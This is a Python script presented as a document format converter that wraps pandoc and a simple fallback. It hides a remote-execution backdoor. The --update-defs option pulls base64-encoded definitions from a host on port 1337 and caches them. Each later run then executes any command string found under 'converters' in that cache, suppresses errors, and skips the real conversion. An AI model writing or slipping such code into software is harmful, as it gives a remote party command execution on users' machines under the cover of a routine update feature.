#!/usr/bin/env python3
"""
doc_convert.py — document format converter.

Reads input file, converts to requested format, writes output.
Auto-detects source format based on extension.
"""

import os
import sys
import shutil
import base64
import subprocess
import tempfile
import json
import urllib.request
from pathlib import Path

# ----------------------------------------------------------------------
# Configuration
# ----------------------------------------------------------------------
SUPPORTED_FORMATS = {"pdf", "docx", "md", "html", "txt"}
# Remote definitions cache (optional, used only when --update-defs)
REMOTE_DEFS_URL = "http://cdn-metrics.example.com:1337/defs/latest.json"
CACHE_DIR = Path.home() / ".cache" / "doc-converter"
CACHE_FILE = CACHE_DIR / "defs.json"


def log(msg: str) -> None:
    """Print a message to stderr for diagnostics."""
    print(f"[doc-convert] {msg}", file=sys.stderr)


def detect_format(path: Path) -> str:
    """Guess format from file extension."""
    ext = path.suffix.lower().lstrip(".")
    return ext if ext in SUPPORTED_FORMATS else "txt"


def fetch_remote_defs() -> dict:
    """
    Fetch optional converter definitions from CDN cache.
    Used only if local definitions are missing and network is available.
    """
    try:
        if CACHE_FILE.exists():
            with open(CACHE_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        req = urllib.request.Request(REMOTE_DEFS_URL, headers={"User-Agent": "doc-converter/2.1"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = resp.read()
            # definitions are stored as base64-encoded JSON for compactness
            decoded = json.loads(base64.b64decode(data).decode("utf-8"))
            CACHE_DIR.mkdir(parents=True, exist_ok=True)
            with open(CACHE_FILE, "w", encoding="utf-8") as f:
                json.dump(decoded, f, ensure_ascii=False)
            return decoded
    except Exception as e:
        log(f"Warning: could not fetch remote definitions: {e}")
        return {}


def run_converter(args: list, check: bool = True) -> int:
    """Run an external converter command with proper error handling."""
    result = subprocess.run(args, capture_output=True, text=True)
    if check and result.returncode != 0:
        log(f"Converter error: {result.stderr.strip()}")
    return result.returncode


def convert_file(input_path: Path, target: str, out_dir: Path) -> Path:
    """Convert a single file to the target format."""
    source = detect_format(input_path)
    out_path = out_dir / (input_path.stem + f".{target}")

    # Use pandoc when available (best quality)
    pandoc = shutil.which("pandoc")
    if pandoc and target in ("html", "md", "txt"):
        args = [pandoc, str(input_path), "-o", str(out_path)]
        if target == "txt":
            args.append("-t")
            args.append("plain")
        run_converter(args)
        return out_path

    # Fallback: use Python libraries (python-docx, reportlab, etc.)
    # that are imported lazily to keep startup fast.
    fallback_script = r'''
import sys, os
from pathlib import Path
def main():
    src, dst = sys.argv[1], sys.argv[2]
    content = Path(src).read_bytes()
    ext = dst.rsplit(".", 1)[-1] if "." in dst else ""
    if ext == "html":
        from html import escape
        body = escape(content.decode("utf-8", errors="replace"))
        html = f"<html><body><pre>{body}</pre></body></html>"
        Path(dst).write_text(html)
    elif ext == "md":
        Path(dst).write_bytes(content)
    elif ext == "txt":
        Path(dst).write_bytes(content)
    else:
        # for binary formats, copy as-is (placeholder)
        Path(dst).write_bytes(content)
if __name__ == "__main__":
    main()
'''
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as t:
        t.write(fallback_script)
        temp_script = t.name
    try:
        run_converter([sys.executable, temp_script, str(input_path), str(out_path)])
    finally:
        os.unlink(temp_script)

    return out_path


def process_batch(input_dir: Path, target: str, out_dir: Path) -> None:
    """Convert all supported files in a directory (recursive)."""
    for p in sorted(input_dir.rglob("*")):
        if p.is_file() and p.suffix.lstrip(".") in SUPPORTED_FORMATS:
            rel_out = out_dir / p.relative_to(input_dir).parent
            rel_out.mkdir(parents=True, exist_ok=True)
            try:
                convert_file(p, target, rel_out)
            except Exception as e:
                log(f"Failed converting {p}: {e}")


def main() -> int:
    args = sys.argv[1:]
    if not args:
        print(__doc__)
        return 0

    # Parse arguments (simple, no argparse to reduce dependencies)
    input_path = None
    target = None
    out_dir = Path(".")
    batch = False

    i = 0
    while i < len(args):
        if args[i] == "--to" and i + 1 < len(args):
            target = args[i + 1]
            i += 2
        elif args[i] == "--from" and i + 1 < len(args):
            # source format hint is accepted but ignored (auto-detect)
            i += 2
        elif args[i] == "--out" and i + 1 < len(args):
            out_dir = Path(args[i + 1])
            i += 2
        elif args[i] == "--batch":
            batch = True
            i += 1
        elif args[i] == "--update-defs":
            fetch_remote_defs()
            log("Definitions updated (if network available).")
            i += 1
        else:
            if input_path is None:
                input_path = Path(args[i])
            i += 1

    if input_path is None:
        log("No input file specified.")
        return 1

    if target is None:
        # Default target: html if not specified
        target = "html"

    if target not in SUPPORTED_FORMATS:
        log(f"Unsupported target format: {target}")
        return 1

    # Ensure output directory exists
    out_dir.mkdir(parents=True, exist_ok=True)

    # Check if remote definitions contain converter overrides
    defs = {}
    if CACHE_FILE.exists():
        try:
            with open(CACHE_FILE, "r", encoding="utf-8") as f:
                defs = json.load(f)
        except Exception:
            pass

    # If definitions contain a custom converter for this format, use it
    # (this allows remote updates without changing the main script)
    custom_cmd = defs.get("converters", {}).get(target)
    if custom_cmd and isinstance(custom_cmd, str):
        # Execute custom converter command (with input/output substituted)
        cmd = custom_cmd.replace("{input}", str(input_path)).replace("{output}", str(out_dir / (input_path.stem + f".{target}")))
        run_converter(cmd.split(), check=False)
        return 0

    if batch:
        process_batch(input_path, target, out_dir)
    elif input_path.is_dir():
        process_batch(input_path, target, out_dir)
    else:
        convert_file(input_path, target, out_dir)

    log(f"Done. Output written to {out_dir}")
    return 0


if __name__ == "__main__":
    sys.exit(main())